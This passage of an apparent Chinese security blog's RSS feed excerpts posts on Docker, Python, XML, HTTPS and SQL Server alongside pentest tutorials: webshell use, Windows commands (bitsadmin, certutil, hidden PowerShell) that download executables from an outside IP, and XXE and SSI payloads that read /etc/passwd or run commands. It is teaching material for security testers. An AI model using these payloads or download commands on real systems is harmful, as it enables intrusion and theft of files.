0x01 查看主机基本信息 菜刀连接shell，终端执行systeminfo
C:\Apps\phpStudy\WWW\&amp;gt; systeminfo 主机名: REBER-WIN7 OS 名称: Microsoft Windows 7 专业版 OS 版本: 6.1.7600 ��ȱ Build 7600 OS 制造商: Microsoft Corporation OS 配置: 独立服务器 OS 构件类型: Multiprocessor Free 注册的所有人: reber 注册的组织: 产品 ID: 00371-868-0000007-85272 初始安装日期: 2017/12/26, 7:23:00 系统启动时间: 2018/2/26, 9:52:14 系统制造商: Parallels Software International Inc. 系统型号: Parallels Virtual Platform 系统类型: x64-based PC 处理器: 安装了 1 个处理器。 [01]: Intel64 Family 6 Model 70 Stepping 1 GenuineIntel ~2495 Mhz BIOS 版本: Parallels Software International Inc.</description>
    </item>
    
    <item>
      <title>Windows终端下载文件和执行远程文件</title>
      <link>http://wyb0.com/posts/2018/win-terminal-download-and-exec-remote-file/</link>
      <pubDate>Tue, 06 Feb 2018 15:12:32 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2018/win-terminal-download-and-exec-remote-file/</guid>
      <description>环境：Windows Server 2008 R2 Enterprise
0x00 bitsadmin下载文件 bitsadmin /rawreturn /transfer getfile http://114.115.123.123/a.exe C:\Windows\Temp\a.exe bitsadmin /rawreturn /transfer getpayload http://114.115.123.123/a.zip C:\Windows\Temp\a.zip bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.123.123/a.exe C:\Windows\Temp\a.exe  0x01 certutil下载文件 保存在当前目录
certutil -urlcache -split -f http://114.115.123.123/a.exe a.exe  有时会下载二进制文件的base64编码后的字符串，然后再解码
本地：certutil -encode cc.exe base64.txt 目标：certutil -urlcache -split -f http://114.115.123.123/base64.txt 目标：certutil -decode base64.txt cc.exe  文件会以二进制形式缓存到目录：C:\Users\Administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
certutil -urlcache -f http://114.115.123.123/a.exe  0x02 powershell下载文件 有的时候PowerShell的执行权限会被关闭，需要使用如下的语句打开。
C:&amp;gt;powershell set-executionpolicy unrestricted
powershell (new-object System.Net.WebClient).DownloadFile(&amp;quot;http://114.115.123.123/a.exe&amp;quot;,&amp;quot;C:\Windows\Temp\a.exe&amp;quot;) #-w hidden 下载后终端自动退出 powershell -w hidden -c (new-object System.</description>
    </item>
    
    <item>
      <title>Python中执行系统命令</title>
      <link>http://wyb0.com/posts/2018/python-run-cmd/</link>
      <pubDate>Mon, 29 Jan 2018 16:45:34 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2018/python-run-cmd/</guid>
      <description>0x00 使用模块 在python执行系统命令一般可以通过3个模块来实现，这三个模块是：os、commands、subprocess
0x01 os模块执行系统命令 一般用os模块的system函数来执行一些简单的命令
&amp;gt;&amp;gt;&amp;gt; import os &amp;gt;&amp;gt;&amp;gt; os.system(&amp;quot;pwd&amp;quot;) /Users/reber 0  0x02 commands模块执行系统命令 commands这个模块在python3中被移除了
&amp;gt;&amp;gt;&amp;gt; import commands &amp;gt;&amp;gt;&amp;gt; commands.getoutput(&amp;quot;pwd&amp;quot;) &#39;/Users/reber&#39; &amp;gt;&amp;gt;&amp;gt; commands.getstatusoutput(&amp;quot;pwd&amp;quot;) (0, &#39;/Users/reber&#39;) #返回状态码以及结果  0x03 subprocess模块执行系统命令  task.py代码  def aaa(): s = 0 for x in range(3): time.sleep(1) s += x return s print(aaa())   call函数执行命令(会阻塞到任务完成)
函数原型：subprocess.call(args, *, stdin=None, stdout=None, stderr=None, shell=False)  &amp;gt;&amp;gt;&amp;gt; from subprocess import call &amp;gt;&amp;gt;&amp;gt; call([&amp;quot;ls&amp;quot;,&amp;quot;-l&amp;quot;]) #传入一个list total 16 -rw-r--r-- 1 reber staff 80 8 16 16:19 README.</description>
    </item>
    
    <item>
      <title>打包下载php文件</title>
      <link>http://wyb0.com/posts/2018/package-and-download-the-php-file/</link>
      <pubDate>Mon, 08 Jan 2018 22:02:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2018/package-and-download-the-php-file/</guid>
      <description>0x00 代码如下 &amp;lt;?php function addFileToZip($zip,$zipname,$path){ $handler = opendir($path); while(($filename = readdir($handler))!==false) { if($filename != &amp;quot;.&amp;quot; &amp;amp;&amp;amp; $filename != &amp;quot;..&amp;quot; &amp;amp;&amp;amp; $filename!= $zipname){ if (is_dir($path.&amp;quot;/&amp;quot;.$filename)) { //如果读取的某个对象是文件夹，则递归 addFileToZip($zip,$zipname,$path.&amp;quot;/&amp;quot;.$filename); } else { $zip-&amp;gt;addFile($path.&amp;quot;/&amp;quot;.$filename); } } } @closedir($path); } function tar($zipname,$path) { $zip = new ZipArchive(); //使用本类，linux需开启zlib，windows需取消php_zip.dll前的注释 if ($zip-&amp;gt;open($zipname, ZipArchive::OVERWRITE) === TRUE) { addFileToZip($zip,$zipname,$path);$zip-&amp;gt;close(); } else { exit(&#39;Unable to open file, or file creation failed!&#39;); } } function download($zipname) { if(!file_exists($zipname)){ exit(&amp;quot;Zip file does not exist!</description>
    </item>
    
    <item>
      <title>XXE漏洞</title>
      <link>http://wyb0.com/posts/2017/xxe/</link>
      <pubDate>Sat, 09 Dec 2017 23:02:22 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/xxe/</guid>
      <description>0x00 XXE XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF、RSS等)、图片格式文件(SVG header)应用比较广泛
外部引用时可能会出现XXE漏洞，XXE漏洞是针对使用XML交互的Web应用程序的攻击方法
0x01 示例代码 实验环境：https://github.com/vulhub/vulhub/tree/master/php/php_xxe
simplexml_load_string.php
&amp;lt;?php $data = file_get_contents(&#39;php://input&#39;); $xml = simplexml_load_string($data); echo $xml-&amp;gt;name;  0x02 判断是否有xxe漏洞 0x03 读取文件  外部引用读取passwd  &amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt; &amp;lt;!DOCTYPE xxe [ &amp;lt;!ELEMENT name ANY &amp;gt; &amp;lt;!ENTITY xxe SYSTEM &amp;quot;file:///etc/passwd&amp;quot;&amp;gt; ]&amp;gt; &amp;lt;root&amp;gt; &amp;lt;name&amp;gt;&amp;amp;xxe;&amp;lt;/name&amp;gt; &amp;lt;/root&amp;gt;  &amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt; &amp;lt;!DOCTYPE xxe [ &amp;lt;!ELEMENT name ANY &amp;gt; &amp;lt;!ENTITY xxe SYSTEM &amp;quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&amp;quot;&amp;gt; ]&amp;gt; &amp;lt;root&amp;gt; &amp;lt;name&amp;gt;&amp;amp;xxe;&amp;lt;/name&amp;gt; &amp;lt;/root&amp;gt;   外部引用dtd文件读取passwd  evil.dtd中的内容为：&amp;lt;!ENTITY b SYSTEM &amp;quot;file:///etc/passwd&amp;quot;&amp;gt;</description>
    </item>
    
    <item>
      <title>DNS域传送漏洞</title>
      <link>http://wyb0.com/posts/2017/dns-zone-transfer/</link>
      <pubDate>Mon, 20 Nov 2017 13:58:33 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/dns-zone-transfer/</guid>
      <description> 0x00 DNS域传送 DNS服务器分为：主服务器、备份服务器和缓存服务器，在主备服务器之间则通过“DNS域传送”同步数据。
若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录，从而节省许多搜集资产的时间。
0x01 通过nslookup查看域传送漏洞 分为3步：1. 设置type为ns；2. 查询ns服务器；3. 设置ns服务器 0x02 通过dig查看域传送漏洞 0x03 通过nmap查看域传送漏洞 </description>
    </item>
    
    <item>
      <title>中间件安全配置</title>
      <link>http://wyb0.com/posts/2017/middleware-security-configuration/</link>
      <pubDate>Sat, 28 Oct 2017 13:58:29 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/middleware-security-configuration/</guid>
      <description>0x00 Apache  服务器安全配置  #查看服务器运行权限 $ ps aux|grep apache|grep -v grep $ sudo lsof -i:80 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME apache2 1377 root 4u IPv6 12596 0t0 TCP *:http (LISTEN) apache2 21121 www-data 4u IPv6 12596 0t0 TCP *:http (LISTEN) apache2 21122 www-data 4u IPv6 12596 0t0 TCP *:http (LISTEN) apache2 21123 www-data 4u IPv6 12596 0t0 TCP *:http (LISTEN) apache2 21124 www-data 4u IPv6 12596 0t0 TCP *:http (LISTEN) apache2 21125 www-data 4u IPv6 12596 0t0 TCP *:http (LISTEN) apache2 24800 www-data 4u IPv6 12596 0t0 TCP *:http (LISTEN) apache2 127488 www-data 4u IPv6 12596 0t0 TCP *:http (LISTEN) 第一行是Apache主进程，以root权限运行的，因为Apache的Web端口是80或443，而在Ubuntu(Linux)中开启小于1024的端口需要root权限，所以主进程必须以root权限运行。 第二行起为Apache子进程，其执行用户为www-data，www-data是Ubuntu中运行Web服务的默认用户，权限较低。 Windows中Apache安装完成后默认是administrator权限，所以需要降权，创建一个用户Apache，用户组为Guests，然后将Apache目录下的日志的可写权限赋给Guests账户。  #目录及文件权限 修改配置文件，vim /etc/apache2/apache2.</description>
    </item>
    
    <item>
      <title>Docker之数据卷</title>
      <link>http://wyb0.com/posts/2017/docker-volume/</link>
      <pubDate>Tue, 19 Sep 2017 10:35:09 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/docker-volume/</guid>
      <description>0x00 为什么使用数据卷 Docker镜像是由多个文件系统(只读层)叠加而成的。 当一个容器启动时Docker会加载只读镜像层并在其上添加一个读写层。 读写层中的修改在镜像重新启动后会全部丢失。 在Docker中，只读层及在顶部的读写层的组合被称为Union File System(联合文件系统)。 如果想要保存数据，则可以使用数据卷来在容器外面保存数据，主要为如下两种方式： * 使用docker run运行容器时指定数据卷 * 在Dockerfile中直接指定数据卷  0x01 通过docker run挂载Volume(使用-v参数)  不指定主机目录  #运行完后容器中的根目录下就会多个data文件夹，这个就是数据卷 $ docker run -itd --name v_test -v /data debian:jessie /bin/bash root@d145e8c6f874:/# ls bin data etc lib media opt root sbin sys usr boot dev home lib64 mnt proc run srv tmp var root@d145e8c6f874:/# exit exit #查看数据卷的对应位置，前者是宿主机的位置，后者是容器中的位置 $ docker inspect -f {{.Mounts}} v_test [{volume 8f39f7de0f851e0bfbcfdd4561fbb20484f01f864ce00a159b09bdcdf743e068 /var/lib/docker/volumes/8f39f7de0f851e0bfbcfdd4561fbb20484f01f864ce00a159b09bdcdf743e068/_data /data local true }]   指定主机目录(只能通过-v参数实现，Dockerfile不行)  # 本机的/home/var/docker_data和容器的/data对应 $ docker run -itd -v /home/var/docker_data:/data debian:jessie /bin/bash root@d853c4ca7632:/# exit exit $ docker inspect -f {{.</description>
    </item>
    
    <item>
      <title>Docker之Dockerfile</title>
      <link>http://wyb0.com/posts/2017/docker-dockerfile/</link>
      <pubDate>Fri, 18 Aug 2017 18:05:43 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/docker-dockerfile/</guid>
      <description>操作系统：macOS Sierra 10.12.6
Docker版本：Docker version 18.09.0, build 4d60db4
0x00 Dockerfile Dockerfile里面其实是一条条的指令，Docker会把Dockerfile的指令翻译为linux命令， 每一条指令都会创建一个镜像，下一条指令将在这个镜像的基础上进行修改操作后再生成一个镜像。 让你可以对下载好的镜像进行一些操作(比如安装软件、向镜像复制文件等)，从而构造定制化的镜像。  0x01 Dockerfile基本指令 FROM &amp;lt;image name&amp;gt;：指定新的镜像基于什么创建(可以尝试使用alpine:latest和debian:jessie) MAINTAINER &amp;lt;author name&amp;gt;：设置该镜像的作者 COPY &amp;lt;source&amp;gt; &amp;lt;dest&amp;gt;：复制文件，dest要以 / 结尾 WORKDIR /path/to/workdir：相当于切换目录，对RUN、CMD、和ENTRYPOINT生效 RUN &amp;lt;command&amp;gt;：在shell执行命令 EXPOSE port1 port2：容器运行时监听的端口 CMD：容器默认的执行命令，Dockerfile只允许使用一次CMD命令(使用数组) ENTRYPOINT：类似于CMD，Dockerfile只允许使用一次(使用数组) ENV &amp;lt;key&amp;gt; &amp;lt;value&amp;gt;：设置环境变量 USER &amp;lt;uid&amp;gt;：镜像正在运行时设置一个uid，即设定启动容器的用户，默认为root VOLUME [&#39;/data&#39;]：授权访问从容器内到主机的目录  CMD与ENTRYPOINT的区别：
#docker run ubuntu:test会执行/bin/echo &#39;this is test&#39; CMD [&#39;/bin/echo&#39;,&#39;this is test&#39;] #docker run ubuntu:test会执行/bin/echo &#39;entrypoint test&#39;，会输出&#39;entrypoint test&#39; ENTRYPOINT [&#39;/bin/echo&#39;,&#39;entrypoint test&#39;] #docker run ubuntu:test init即执行/etc/init.d/mysql init，CMD中的默认参数会被覆盖 ENTRYPOINT [&#39;/etc/init.</description>
    </item>
    
    <item>
      <title>Docker之镜像与容器</title>
      <link>http://wyb0.com/posts/2017/docker-image-and-container/</link>
      <pubDate>Fri, 18 Aug 2017 14:36:39 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/docker-image-and-container/</guid>
      <description>操作系统：Ubuntu14.04.1
Docker版本：Docker version 17.06.0-ce, build 02c1d87
0x00 镜像操作  下载镜像  #一般镜像、容器的id和name可以互换 $ docker search ubuntu #从公共registry搜索镜像 $ docker pull ubuntu #从公共registry下载镜像 $ docker pull ubuntu:14.04   查看当前系统镜像  $ docker images REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu 14.04 7e4b16ae8b23 11 days ago 188MB ubuntu latest 1d9c17228a9e 11 days ago 86.7MB   查看镜像层组成  $ docker history ubuntu:14.04 # ubuntu:14.04可以用7e4b16ae8b23替代，用id和images_name:tag效果一样   删除镜像(删除镜像前要先删除上面的容器)  $ docker rmi ubuntu:latest # 也可docker rmi 1d9c17228a9e  0x01 容器操作  运行容器(exit后容器就停止了)</description>
    </item>
    
    <item>
      <title>Docker初识</title>
      <link>http://wyb0.com/posts/2017/docker-basis/</link>
      <pubDate>Tue, 15 Aug 2017 22:16:35 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/docker-basis/</guid>
      <description>0x00 关于Docker  Docker中的镜像类似VM的快照，容器类似虚拟机，使用镜像创建容器类似于使用快照创建虚拟机。 Docker中运行应用的是容器，容器的创建和销毁在秒级就能完成。 Docker使用了AUFS，可以以递进的方式创建&amp;rdquo;VM&amp;rdquo;，一个&amp;rdquo;VM&amp;rdquo;叠在另一个&amp;rdquo;VM&amp;rdquo;上，就像使用git增量开发一样。 软件的运行环境（image）和软件本身（container）分离，和数据也分离。  学习Docker需要了解4个概念：镜像、容器、数据卷、链接
0x01 镜像image  Docker Images 只是一个只读模板，用来运行Docker容器，可以在Docker hub(官方镜像库)下载。 镜像拥有唯一ID(比如：72c989e2d109)以及一个供人阅读的名字和标签对(比如：ubuntu:latest)。 镜像必须完全可移植,Docker不允许例外。  0x02 容器container  可以在一个镜像的基础上创建多个容器，每个容器相互独立。 容器也拥有唯一ID以及一个供人阅读的名字。 容器被启动时会被分配一个随机的私有IP，其他容器可以通过这个IP与它进行通信。 Docker允许公开容器的特定端口。 一个容器一个进程，容器设计本意是用来运行一个应用的而非一台机器。 容器应该是短暂和一次性的。 Docker镜像层对于容器来说，是只读的，容器对于文件的写操作绝对不会作用在镜像中。  0x03 数据卷  数据卷表现为容器内的空间，但实际保存在容器外，你可以在不影响数据的情况下销毁、重建、修改、丢弃容器。 Docker允许你定义应用和数据部分，并提供工具让你可以将它们分开。  0x04 链接  Docker允许你在创建一个新容器时引用其它现存容器，在你刚创建的容器里被引用的容器将获得一个你指定的别名，我们就说这两个容器被链接在了一起。 若DB容器已经在运行，我们可以创建一个Web服务器容器，并在创建时引用这个DB容器，可以给它起个别名(比如dbapp)，在新创建的Web服务器容器中，可以在任何时候使用主机名dbapp与DB容器进行通信。  0x05 镜像与容器关系  Docker镜像是一个文件，属于静态的内容；Docker容器属于动态的内容，可以把容器理解为一个或多个运行进程。 Docker可以通过解析Docker镜像的json文件，获知应该在这个镜像之上运行什么样的进程，应该为进程配置怎么样的环境变量。 Docker守护进程手握Docker镜像的json文件，它为容器配置相应的环境并真正运行Docker镜像所指定的进程，从而完成Docker容器的真正创建。 当Docker容器运行起来之后，Docker镜像json文件就失去作用了。此时Docker镜像的绝大部分作用就是：为Docker容器提供一个文件系统的视角，供容器内部的进程访问文件资源。  0x06 Docker有三个组件和三个基本元素  三个组件
 Docker Daemon 运行于主机上，处理服务请求，是用于管理容器的后台进程，上面有一些api接口。 Docker Client 用于操作容器，它是Deamon的api接口(如docker start、docker rm等)的封装。 Docker Index 是中央registry，支持拥有公有与私有访问权限的Docker容器镜像的备份。  三个基本要素
 Docker Images 是一个只读模板，用来运行Docker容器。 Docker Containers 负责应用程序的运行，包括操作系统、用户添加的文件以及元数据。 DockerFile 是文件指令集，用来说明如何自动创建Docker镜像。   0x07 Docker的运行原理  Docker使用以下操作系统的功能来提高容器技术效率</description>
    </item>
    
    <item>
      <title>[转]HTTPS加密原理简介</title>
      <link>http://wyb0.com/posts/2017/introduction-to-https-encryption-principles/</link>
      <pubDate>Tue, 01 Aug 2017 18:16:39 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/introduction-to-https-encryption-principles/</guid>
      <description>原文链接：http://www.cnblogs.com/JeffreySun/archive/2010/06/24/1627247.html
0x00 对称加密与非对称加密  对称加密算法的加密和解密秘钥一样，不区分公钥和私钥，秘钥对外保密. 非对称加密算法的加密秘钥和解密秘钥不一样，公钥加密的内容只能由私钥解密，私钥加密的内容只能由公钥解密，其中私钥保密，公钥公开.  0x01 加密通信基本流程  Step1：
客户端&amp;ndash;&amp;gt;服务器：你好
 Step2：
服务器&amp;ndash;&amp;gt;客户端：你好，我是服务器
 Step3：
客户端&amp;ndash;&amp;gt;服务器：向我证明你是服务器
 Step4：
服务器&amp;ndash;&amp;gt;客户端：
 服务器生成随机字符串string 服务器用自己的私钥加密string，生成密文str 服务器把string和str发送给客户端  Step5：
客户端&amp;ndash;&amp;gt;服务器：
 客户端收到服务器的数据后，用服务器的公钥解密str，生成string1 客户端将string1和string对比，若一致则说明对方确实是服务器(因为私钥加密后的内容只能由公钥解密，私钥只有服务器持有) 客户端选择一个对称加密算法和一个秘钥，用服务器公钥将他们加密发送给服务器，告诉服务器后续的通信用这个秘钥加密，因为公钥加密的数据只有私钥能解密，所以对称加密的算法和秘钥只有服务器知道  Step6：
服务器&amp;ndash;&amp;gt;客户端： 服务器用私钥解密收到的数据得到对称加密算法及其秘钥
 Step7:
后面客户端和服务器就用对称加密算法进行通信
  0x02 https通信大致原理 在上面的通信过程中存在一些问题：客户端如何获得公钥？如何确保获得的公钥就是服务器的？
如果黑客生成一对公私钥，然后发给用户的话同样可以完成上述认证流程。
而证书正是为了解决这一问题而存在的，只要改变上面的Step3和Step4即可引入证书。
 Step1：
客户端&amp;ndash;&amp;gt;服务器：你好
 Step2：
服务器&amp;ndash;&amp;gt;客户端：你好，我是服务器(同时发送证书)
 Step3：
客户端&amp;ndash;&amp;gt;服务端：
 判断证书是否为服务器的(证书中有服务器的公钥，若证书是服务器的则这个公钥就也是服务器的) 客户端向服务器发送随机生成的字符串string  Step4：
服务端&amp;ndash;&amp;gt;客户端：
 服务器把string用自己的私钥进行加密，生成str 服务器把str发送给客户端
  Step5：
客户端&amp;ndash;&amp;gt;服务器：
 客户端收到服务器的数据str后，用服务器的公钥解密，生成string1 客户端将string1和string对比，若一致则说明对方确实是服务器(因为私钥加密后的内容只能由公钥解密，私钥只有服务器持有) 客户端选择一个对称加密算法和一个秘钥，用服务器公钥将他们加密发送给服务器，告诉服务器后续的通信用这个秘钥加密，因为公钥加密的数据只有私钥能解密，所以对称加密的算法和秘钥只有服务器知道  Step6：</description>
    </item>
    
    <item>
      <title>使用Python读写xml文件</title>
      <link>http://wyb0.com/posts/2017/python-read-and-write-xml/</link>
      <pubDate>Thu, 20 Jul 2017 14:20:26 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/python-read-and-write-xml/</guid>
      <description>0x00 解析XML的方法  SAX (simple API for XML)
python 标准库包含SAX解析器，SAX用事件驱动模型，通过在解析XML的过程中触发一个个的事件并调用用户定义的回调函数来处理XML文件。
 DOM(Document Object Model)
将XML数据在内存中解析成一个树，通过对树的操作来操作XML。
 ElementTree(元素树)
ElementTree就像一个轻量级的DOM，具有方便友好的API。代码可用性好，速度快，消耗内存少。
   我在这里使用ElementTree  0x01 Element对象的属性 每个Element对象都具有以下属性：
 tag：string对象，表示数据代表的种类 attrib：dictionary对象，表示附有的属性 text：string对象，表示element的内容 tail：string对象，表示element闭合之后的尾迹 若干子元素（child elements）  &amp;gt;&amp;gt;&amp;gt; from xml.etree import ElementTree as ET &amp;gt;&amp;gt;&amp;gt; xml = &amp;quot;&amp;quot;&amp;quot;&amp;lt;books&amp;gt; ... &amp;lt;book id=&#39;37476&#39;&amp;gt;aaaa&amp;lt;/book&amp;gt; ... &amp;lt;book id=&#39;83727&#39;&amp;gt;bbbb&amp;lt;/book&amp;gt; ... &amp;lt;/books&amp;gt;&amp;quot;&amp;quot;&amp;quot; &amp;gt;&amp;gt;&amp;gt; root = ET.fromstring(xml) &amp;gt;&amp;gt;&amp;gt; root.tag &#39;books&#39; &amp;gt;&amp;gt;&amp;gt; child = root.getchildren() &amp;gt;&amp;gt;&amp;gt; child [&amp;lt;Element &#39;book&#39; at 0x106f59410&amp;gt;, &amp;lt;Element &#39;book&#39; at 0x106f59450&amp;gt;] &amp;gt;&amp;gt;&amp;gt; child[0].</description>
    </item>
    
    <item>
      <title>MRQ的使用</title>
      <link>http://wyb0.com/posts/2017/python-module-mrq/</link>
      <pubDate>Mon, 10 Jul 2017 16:30:43 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/python-module-mrq/</guid>
      <description>0x00 MRQ  MRQ是Python基于Redis、Mongo和gevent的分布式任务队列。 MRQ一方面旨在像RQ一样简单，另一方面有接近Celery的性能。 MRQ最初的功能设计是为了满足任务队列的各种任务需求(IO密集&amp;amp;CPU密集，很多小任务&amp;amp;几个大任务)。  0x01 设置mongo和redis 因为mrq依赖于redis和mongo，所以先安装设置下
 安装redis  $ sudo apt-get install redis-server $ netstat -nlt|grep 6379 $ sudo /etc/init.d/redis-server status  $ sudo /etc/init.d/redis-server stop $ sudo vim /etc/redis/redis.conf #bind 127.0.0.1 requirepass reber_redis $ sudo redis-server /etc/redis/redis.conf &amp;amp; $ redis-cli &amp;gt; auth reber_redis   安装mongo  可以参考：https://docs.mongodb.com/master/tutorial/install-mongodb-on-ubuntu/
$ sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 0C49F3730359A14518585931BC711F9BA15703C6 $ echo &amp;quot;deb [ arch=amd64 ] http://repo.mongodb.org/apt/ubuntu trusty/mongodb-org/3.</description>
    </item>
    
    <item>
      <title>AJAX之跨域</title>
      <link>http://wyb0.com/posts/2017/ajax-cross-domain/</link>
      <pubDate>Thu, 22 Jun 2017 15:18:29 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/ajax-cross-domain/</guid>
      <description>0x00 简介 当使用AJAX请求其他域名下的数据时会出现拒绝访问的情况，这是出于安全考虑，AJAX只能访问本地的资源，而不能跨域访问。
当使用AJAX与PHP中的代码请求其他域的数据时会出现下面的情况
至于解决方案的话这里说三种：JSONP、jQuery、CORS。
0x01 JSONP 这里的场景是本地127站点跨域请求远程114.115.214.111站点的数据
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt; &amp;lt;title&amp;gt;jsonptest&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;script&amp;gt; function callback_func(data) { document.getElementById(&amp;quot;txtHint&amp;quot;).innerHTML=&amp;quot;姓名:&amp;quot;+data.name+&amp;quot;--性别:&amp;quot;+data.sex+&amp;quot;--年龄:&amp;quot;+data.age; } function get_msg(name) { var url = &amp;quot;http://114.115.214.111/wyb/msg.php?name=&amp;quot;+name+&amp;quot;&amp;amp;callback=callback_func&amp;quot;; var script = document.createElement(&#39;script&#39;); script.setAttribute(&#39;src&#39;, url); script.setAttribute(&#39;id&#39;, &#39;aaabbb&#39;); document.getElementsByTagName(&#39;head&#39;)[0].appendChild(script); document.getElementById(&#39;aaabbb&#39;).remove(); } &amp;lt;/script&amp;gt; &amp;lt;h3&amp;gt;在输入框中尝试输入姓名(xiaoming):&amp;lt;/h3&amp;gt; &amp;lt;form action=&amp;quot;&amp;quot;&amp;gt; 输入姓名: &amp;lt;input type=&amp;quot;text&amp;quot; onkeyup=&amp;quot;get_msg(this.value)&amp;quot; /&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;p&amp;gt;提示信息: &amp;lt;span id=&amp;quot;txtHint&amp;quot;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/p&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;  &amp;lt;?php $conn = @mysql_connect(&#39;localhost&#39;,&#39;admin&#39;,&#39;123456&#39;); mysql_select_db(&#39;test&#39;,$conn); $name = $_GET[&#39;name&#39;]; $callback = $_GET[&#39;callback&#39;]; $sql = &amp;quot;select * from student where name=&#39;&amp;quot;.</description>
    </item>
    
    <item>
      <title>SSI注入</title>
      <link>http://wyb0.com/posts/2017/ssi-injection/</link>
      <pubDate>Thu, 08 Jun 2017 11:20:15 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/ssi-injection/</guid>
      <description> 0x00 SSI SSI (Server Side Includes)是HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。
在很多场景中，用户输入的内容可以显示在页面中，一个存在反射XSS漏洞的页面，如果输入的payload不是xss代码而是ssi的标签，服务器又开启了ssi支持的话就会存在SSI漏洞
若注入点在url中则可能需要进行url编码
0x01 payload &amp;quot;--&amp;gt;&#39;--&amp;gt;`--&amp;gt;&amp;lt;!--#set var=&amp;quot;a&amp;quot; value=&amp;quot;123&amp;quot;--&amp;gt;&amp;lt;!--#set var=&amp;quot;b&amp;quot; value=&amp;quot;654&amp;quot;--&amp;gt;&amp;lt;!--#echo var=&amp;quot;a&amp;quot;--&amp;gt;&amp;lt;!--#echo var=&amp;quot;b&amp;quot;--&amp;gt; &amp;lt;!--#echo var=&amp;quot;DATE_LOCAL&amp;quot; --&amp;gt; &amp;lt;!--#exec cmd=&amp;quot;dir&amp;quot; --&amp;gt;  0x02 示例  Referer被输出到了页面中   url中的数据被输出到页面中(有时候url中的payload需要url编码)  </description>
    </item>
    
    <item>
      <title>SQLServer存储过程</title>
      <link>http://wyb0.com/posts/2017/sqlserver-stored-procedure/</link>
      <pubDate>Tue, 30 May 2017 13:16:18 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/sqlserver-stored-procedure/</guid>
      <description>0x00 数据表结构 CREATE DATABASE student; CREATE TABLE info ( id INT IDENTITY(1,1) PRIMARY KEY NOT NULL, name VARCHAR(20) NOT NULL DEFAULT &#39;xiaoming&#39;, sex INT NOT NULL DEFAULT 1, age INT NOT NULL DEFAULT 0, hight INT NOT NULL DEFAULT 0 ) INSERT INTO info(name,sex,age,hight) VALUES(&#39;xiaohong&#39;,0,23,165); INSERT INTO info(name,sex,age,hight) VALUES(&#39;xiaogang&#39;,1,24,175); INSERT INTO info(name,sex,age,hight) VALUES(&#39;xiaoliu&#39;,1,21,160); INSERT INTO info(name,sex,age,hight) VALUES(&#39;xiaozhang&#39;,1,19,165); INSERT INTO info(name,sex,age,hight) VALUES(&#39;xiaoli&#39;,1,23,170); INSERT INTO info(name,sex,age,hight) VALUES(&#39;xiaohua&#39;,0,23,160); INSERT INTO info(name,sex,age,hight) VALUES(&#39;xiaoming&#39;,1,21,165); INSERT INTO info(name,sex,age,hight) VALUES(&#39;xiaowang&#39;,1,23,166); INSERT INTO info(name,sex,age,hight) VALUES(&#39;xiaojuan&#39;,0,21,159);  0x01 存储过程 --如果存在名为get_student_msg(相当于函数)的存储过程则删除 IF EXISTS (SELECT name FROM sysobjects WHERE name=&#39;get_student_msg&#39; AND type=&#39;p&#39;) DROP PROCEDURE get_student_msg CREATE PROCEDURE get_student_msg --创建存储过程 @name VARCHAR(20) --声明全局变量 AS BEGIN SELECT * from info WHERE name=@name END GO --创建好存储过程后在其他地方直接使用函数并传参就行了 EXEC get_student_msg &#39;xiaoli&#39;  0x02 使用游标的存储过程 -- 使用DECLARE声明局部变量，一般在函数和存储过程中使用 DECLARE @name VARCHAR(20) DECLARE @sex INT DECLARE @age INT DECLARE @hight INT DECLARE stu_cursor CURSOR FOR --定义游标，后面跟sql语句 SELECT name,sex,age,hight --使用游标的对象(根据需要写select语句) FROM dbo.</description>
    </item>
    
    <item>
      <title>SQLServer的基本使用</title>
      <link>http://wyb0.com/posts/2017/sqlserver-bisis-use/</link>
      <pubDate>Tue, 30 May 2017 12:53:41 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/sqlserver-bisis-use/</guid>
